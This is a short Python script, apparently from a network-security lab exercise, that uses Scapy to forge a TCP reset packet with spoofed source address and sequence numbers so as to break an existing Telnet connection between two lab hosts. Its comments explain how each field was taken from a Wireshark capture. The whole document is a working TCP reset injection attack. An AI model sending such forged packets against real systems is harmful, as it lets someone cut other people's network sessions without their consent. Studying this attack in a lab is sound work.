#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.5", dst="10.9.0.6")
tcp = TCP(sport=23, dport=55574, flags='R', seq=3710760391, ack=3995009472)
#Flags = R meaning the TCP RESET FLag is update
#Sequence number is using hte next expected sequence number form Wireshark
#Acknowledgement number was not changed
#Dport is the one being used for the current Telnet connection
#Sport is the source port of 23 for hte victim machine
#Source is the vicitm machine
#Destination is hte clenit that established the  Telnet connection
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)